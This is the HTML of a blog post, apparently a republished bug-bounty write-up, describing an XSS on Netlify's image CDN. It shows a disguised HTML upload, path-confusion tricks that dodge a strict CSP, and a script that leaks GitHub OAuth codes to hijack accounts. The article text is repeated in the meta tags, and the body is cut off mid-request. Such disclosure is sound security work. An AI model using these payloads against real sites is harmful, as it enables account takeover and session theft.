<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN | sudi’s blog</title>
<meta name="generator" content="Jekyll v4.3.4" />
<meta property="og:title" content="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN" />
<meta name="author" content="sudi" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN Heyyy Everyonee, In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in https://app.netlify.com and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article: Netlify Image CDN In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible. Some examples of this are: Optimizing: Images | Next.jsNuxt Image: Optimized Images for your Nuxt AppsPreoptimizing Your Images | Gatsby All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs. /_next/image?url=/_gatsby/image/:url/.netlify/image?url=/_ipx/w_200/:url Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back. Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it. Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js LibraryExploiting Static Site Generators: When Static Is Not Actually Static Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint /.netlify/images?url= An example url can be this: https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file [images] remote_images = [ &quot;https://my-images.com/.*&quot;, &quot;https://animals.more-images.com/[bcr]at/.*&quot;] By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there. As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify. So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url ) In case of https://app.netlify.com , the following CDN domain was in the whitelist https://d33wubrfki0l68.cloudfront.net. They use this CDN to host all the user uploaded contents such as profile picture,etc I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ? Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it. {&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;} I found a bypass for this easily , which allowed me to upload any files to the cdn domain.By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2Host: app.netlify.comCookie: RedactedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843Referer: https://app.netlify.com/teams/sudi/overviewContent-Length: 606Origin: https://app.netlify.comSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailers-----------------------------26024016321888288818835600843Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;Content-Type: image/png&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;-----------------------------26024016321888288818835600843-- { &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;} As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response .. And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the CSP being used. Content-Security-Policy: script-src &#39;none&#39; This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses. I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all. For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP. So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening location /.netlify/images { # Set Content Security Policy add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;; What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it? If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSP I started playing with the path GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2Host: app.netlify.com Response: HTTP/2 200 OKContent-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violationsContent-Type: text/html Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrer Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get xss Used a simple poc as this to leak the authorization code from the Github Oauth flow x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);setInterval(function() { console.log(x.location.href);}, 500); I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie. They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP: //.netlify/images This bypass still works you can try playing with the endpoint here https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯ I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :) &lt;hr&gt;&lt;p&gt;Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.&lt;/p&gt;" />
<meta property="og:description" content="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN Heyyy Everyonee, In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in https://app.netlify.com and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article: Netlify Image CDN In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible. Some examples of this are: Optimizing: Images | Next.jsNuxt Image: Optimized Images for your Nuxt AppsPreoptimizing Your Images | Gatsby All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs. /_next/image?url=/_gatsby/image/:url/.netlify/image?url=/_ipx/w_200/:url Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back. Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it. Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js LibraryExploiting Static Site Generators: When Static Is Not Actually Static Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint /.netlify/images?url= An example url can be this: https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file [images] remote_images = [ &quot;https://my-images.com/.*&quot;, &quot;https://animals.more-images.com/[bcr]at/.*&quot;] By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there. As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify. So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url ) In case of https://app.netlify.com , the following CDN domain was in the whitelist https://d33wubrfki0l68.cloudfront.net. They use this CDN to host all the user uploaded contents such as profile picture,etc I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ? Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it. {&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;} I found a bypass for this easily , which allowed me to upload any files to the cdn domain.By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2Host: app.netlify.comCookie: RedactedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843Referer: https://app.netlify.com/teams/sudi/overviewContent-Length: 606Origin: https://app.netlify.comSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailers-----------------------------26024016321888288818835600843Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;Content-Type: image/png&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;-----------------------------26024016321888288818835600843-- { &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;} As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response .. And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the CSP being used. Content-Security-Policy: script-src &#39;none&#39; This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses. I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all. For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP. So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening location /.netlify/images { # Set Content Security Policy add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;; What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it? If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSP I started playing with the path GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2Host: app.netlify.com Response: HTTP/2 200 OKContent-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violationsContent-Type: text/html Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrer Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get xss Used a simple poc as this to leak the authorization code from the Github Oauth flow x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);setInterval(function() { console.log(x.location.href);}, 500); I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie. They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP: //.netlify/images This bypass still works you can try playing with the endpoint here https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\_(ツ)_/¯ I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :) &lt;hr&gt;&lt;p&gt;Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.&lt;/p&gt;" />
<link rel="canonical" href="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html" />
<meta property="og:url" content="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html" />
<meta property="og:site_name" content="sudi’s blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-08-31T00:00:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"sudi"},"dateModified":"2024-08-31T00:00:00+05:30","datePublished":"2024-08-31T00:00:00+05:30","description":"Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN Heyyy Everyonee, In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in https://app.netlify.com and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article: Netlify Image CDN In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible. Some examples of this are: Optimizing: Images | Next.jsNuxt Image: Optimized Images for your Nuxt AppsPreoptimizing Your Images | Gatsby All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs. /_next/image?url=/_gatsby/image/:url/.netlify/image?url=/_ipx/w_200/:url Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back. Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it. Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js LibraryExploiting Static Site Generators: When Static Is Not Actually Static Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint /.netlify/images?url= An example url can be this: https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file [images] remote_images = [ &quot;https://my-images.com/.*&quot;, &quot;https://animals.more-images.com/[bcr]at/.*&quot;] By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there. As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify. So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url ) In case of https://app.netlify.com , the following CDN domain was in the whitelist https://d33wubrfki0l68.cloudfront.net. They use this CDN to host all the user uploaded contents such as profile picture,etc I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ? Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it. {&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;} I found a bypass for this easily , which allowed me to upload any files to the cdn domain.By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2Host: app.netlify.comCookie: RedactedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brContent-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843Referer: https://app.netlify.com/teams/sudi/overviewContent-Length: 606Origin: https://app.netlify.comSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailers-----------------------------26024016321888288818835600843Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;Content-Type: image/png&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;-----------------------------26024016321888288818835600843-- { &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;} As you can see we recieved a successful response, with url which has the .html extension. Now let’s check the Content-Type of the response .. And voilla we now have a working xss in the CDN domain, I thought now it would easy to get xss in the /.netlify/images?url= endpoint But we hit a bummer!! Even though the Content-Type is text/html and the response body contains the xss payload it won’t trigger and is pretty useless due to the CSP being used. Content-Security-Policy: script-src &#39;none&#39; This is the CSP which is being used in this endpoint, as I already mentioned this before it’s impossible to bypass this csp. It’s super strict, leaves no room for any bypasses. I lost my hope and was about to give up. But next morning I had a random thought, I have been testing Netlify for a couple of days now so had a good idea about their application and all. For other endpoints also they have CSP but it’s very relax , in simple terms that one is easy to bypass but this /.netlify/images?url= endpoint returned a different very strict CSP. So on the backend side they must be checking the path of the requested url and serving a different CSP especially for it. Just an example nginx conf of how this might be happening location /.netlify/images { # Set Content Security Policy add_header Content-Security-Policy &quot;script-src &#39;none&#39;&quot;; What if there are any URL parsing confusion b/w the service responsible for serving CSP and the service related to fetching the resource. If this is true can I take advantage of it? If I can provide a path such that it doesn’t matches with the location directive so nginx isn’t able to catch that but the backend service normalizes the path and treats it as /.netlify/images only so a proper response is returned which doesn’t have the strict CSP I started playing with the path GET /./.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x HTTP/2Host: app.netlify.com Response: HTTP/2 200 OKContent-Security-Policy: script-src &#39;nonce-ak9jJ87J3kkfSFdbapb1h7sEJ/RjVtSQ&#39; &#39;strict-dynamic&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; &#39;self&#39; https: http: &#39;none&#39;; report-uri /.netlify/functions/__csp-violationsContent-Type: text/html Nice the theory really works, I was able to make it return a different CSP but with the same response. But /./.netlify/images if I use such a path in browser it would normalize the url to /.netlify/images before making the request to the sevrer Then I tried some url encoding stuff /.netlify%2fimages and this worked perfectly fine I was able to get xss Used a simple poc as this to leak the authorization code from the Github Oauth flow x = window.open(&quot;https://api.netlify.com/auth?provider=github&amp;site_id=app.netlify.com&amp;login=true&amp;redirect=https://app.netlify.com/&quot;);setInterval(function() { console.log(x.location.href);}, 500); I could use this url with the access_tokento login to victim’s account as the access_token in the query param is basically their main session cookie. They tried fixing it but soon enough I found another bypass, by just adding a / before the path I was able to bypass the CSP: //.netlify/images This bypass still works you can try playing with the endpoint here https://app.netlify.com//.netlify/images?url=https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/ce5815cfceaaea304025/xss.html&amp;fit=cover&amp;h=200&amp;w=200&amp;x=x The url is pointing to an old uploaded html file, Netlify fixed the issue by disallowing the upload of arbitrary files on their CDN Domain and left the url parser bug as it is. As you no longer have a way to upload arbitrary file which can lead to xss they consider this issue to be fixed ¯\\_(ツ)_/¯ I hope you liked the writeup, next time you had to deal with a strict csp maybe try playing with the path and see if you can make the server return a relaxed csp or something which might be easier to bypass than the original one and you can get lucky like me :) &lt;hr&gt;&lt;p&gt;Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN was originally published in InfoSec Write-ups on Medium, where people are continuing the conversation by highlighting and responding to this story.&lt;/p&gt;","headline":"Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html"},"url":"http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sudi&apos;s blog" />
<script src="//cdn.jsdelivr.net/npm/@microlink/vanilla@latest/umd/microlink.min.js"></script>

<script>
  document.addEventListener('DOMContentLoaded', function (event) {
    microlink('.card-preview')
  })
</script>
  
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">sudi&#39;s blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-08-31T00:00:00+05:30" itemprop="datePublished">
        Aug 31, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h3>Bypassing CSP via URL Parser Confusions : XSS on Netlify’s Image CDN</h3><p>Heyyy Everyonee,</p><p>In this blogpost I am going to talk about my finding which was a XSS on Netlify’s Image CDN used in <a href="https://app.netlify.com">https://app.netlify.com</a> and how I managed to bypass this CSP Content-Security-Policy: script-src ‘none’ (for those of you who aren’t much familiar with this CSP , in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify’s Image CDN , for those of you unfamiliar with what it is would recommend reading this article:</p><p><a href="https://docs.netlify.com/image-cdn/overview/">Netlify Image CDN</a></p><p>In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.</p><p>Some examples of this are:</p><ul><li><a href="https://nextjs.org/docs/pages/building-your-application/optimizing/images">Optimizing: Images | Next.js</a></li><li><a href="https://image.nuxt.com/">Nuxt Image: Optimized Images for your Nuxt Apps</a></li><li><a href="https://www.gatsbyjs.com/docs/preoptimizing-images/">Preoptimizing Your Images | Gatsby</a></li></ul><p>All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool bugs.</p><pre>/_next/image?url=<br>/_gatsby/image/:url<br>/.netlify/image?url=<br>/_ipx/w_200/:url</pre><p>Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too , to make sure the requested image url is really is an image or not before serving the response back.</p><p>Some don’t do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read SSRF</p><p>It’s a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well , so far have some interesting leads which I hope can be turned into a bug maybe. But well that’s a different topic if I did find something, will make sure to write a blog about it.</p><ul><li><a href="https://samcurry.net/universal-xss-on-netlifys-next-js-library/">Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js Library</a></li><li><a href="https://www.assetnote.io/resources/research/exploiting-static-site-generators-when-static-is-not-actually-static">Exploiting Static Site Generators: When Static Is Not Actually Static</a></li></ul><p>Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint</p><pre>/.netlify/images?url=</pre><p>An example url can be this: <a href="https://app.netlify.com//.netlify/images?url=https://app.netlify.com/favicon.ico">https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico</a></p><p>There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file</p><pre><br>[images]<br>  remote_images = [<br>          &quot;https://my-images.com/.*&quot;, <br>          &quot;https://animals.more-images.com/[bcr]at/.*&quot;]</pre><p>By default the same origin urls are also accepted in the url parameter. You can see in the above config , it makes the use of regex also .*so even little mistakes can have some side effects there.</p><p>As earlier I told some providers don’t do any check on this whether the requested url returns a valid image or not this is in the case of Netlify.</p><p>So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url )</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*YBZB8Yv-rD4KsDS5AzvBVw.png" /></figure><p>In case of <a href="https://app.netlify.com">https://app.netlify.com</a> , the following CDN domain was in the whitelist <a href="https://d33wubrfki0l68.cloudfront.net">https://d33wubrfki0l68.cloudfront.net</a>. They use this CDN to host all the user uploaded contents such as profile picture,etc</p><p>I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS ?</p><p>Indeed there was some checks to make sure the user can’t upload anything else but images. I tried SVG but it didn’t allowed it.</p><pre>{&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;}</pre><p>I found a bypass for this easily , which allowed me to upload any files to the cdn domain.<br>By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the check</p><pre><br>POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2<br>Host: app.netlify.com<br>Cookie: Redacted<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0<br>Accept: */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, 